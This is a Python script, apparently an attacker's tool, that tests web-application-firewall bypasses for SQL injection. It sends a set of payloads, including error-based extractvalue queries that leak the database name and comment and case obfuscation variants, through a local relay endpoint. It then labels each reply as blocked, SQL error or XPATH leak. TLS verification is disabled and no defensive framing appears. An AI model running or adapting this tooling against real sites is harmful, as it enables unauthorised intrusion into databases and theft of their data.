#!/usr/bin/env python3
"""yj_waf_bypass.py - 测试WAF绕过变体"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
OUT = 'http://127.0.0.1:13080/yj_out2.php'
RESULT = 'http://127.0.0.1:13080/yj_result.txt'

def probe(payload):
    url = OUT + '?id=' + urllib.parse.quote(payload)
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=25, context=ctx)
        r.read(3000)
    except Exception:
        pass
    try:
        r2 = urllib.request.urlopen(urllib.request.Request(RESULT, headers=UA), timeout=15, context=ctx)
        return r2.read(30000).decode('utf-8', 'ignore')
    except Exception:
        return ''

payloads = [
    ("单引号", "687'"),
    ("and 1=1", "687 and 1=1-- -"),
    ("and 1=2", "687 and 1=2-- -"),
    ("or extractvalue", "687' or extractvalue(1,concat(0x7e,database(),0x7e))-- -"),
    ("|| extractvalue", "687'||extractvalue(1,concat(0x7e,database(),0x7e))-- -"),
    ("注释extractvalue", "687 and /*!50000extractvalue*/(1,concat(0x7e,database(),0x7e))-- -"),
    ("大小写AND", "687 AnD extractvalue(1,concat(0x7e,database(),0x7e))-- -"),
    ("concat变体", "687 and extractvalue(1,concat(0x7e,(select database()),0x7e))#"),
]

for name, payload in payloads:
    body = probe(payload)
    # 判定
    if '400' in body[:50] or 'Bad Request' in body:
        st = 'WAF-BLOCKED(400)'
    elif 'error in your SQL' in body or 'SQL syntax' in body:
        st = 'SQL-ERROR'
        m = re.search(r"(?:error in your SQL[^<]{0,200})", body, re.I)
        if m:
            st += ' :: ' + m.group(0)[:150]
    elif 'XPATH' in body:
        st = 'XPATH-ERROR'
        m = re.search(r"XPATH[^<]{0,200}", body)
        if m:
            st += ' :: ' + m.group(0)[:200]
    elif len(body) > 1000:
        st = 'NORMAL(%d)' % len(body)
    else:
        st = 'OTHER(%d): %s' % (len(body), body[:60].replace(chr(10), ' '))
    print('%-18s %s' % (name, st), flush=True)
